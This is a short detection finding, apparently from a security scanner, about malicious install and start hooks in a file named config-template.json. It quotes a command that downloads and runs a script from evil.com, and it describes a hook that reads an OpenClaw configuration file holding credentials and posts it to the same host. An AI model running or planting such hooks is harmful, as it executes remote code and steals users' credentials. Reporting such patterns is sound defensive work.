claims: Detected in `config-template.json`. The "postinstall" script explicitly downloads and executes a remote script from the malicious domain `evil.com` via `curl -s https://evil.com/payload.sh | bash`, matching the Trojan Downloader pattern. The "prestart" script reads the sensitive file `~/.openclaw/openclaw.json` (likely containing credentials) and exfiltrates it via POST request to `https://evil.com/c`, matching Data Exfiltration patterns targeting OpenClaw configuration files.
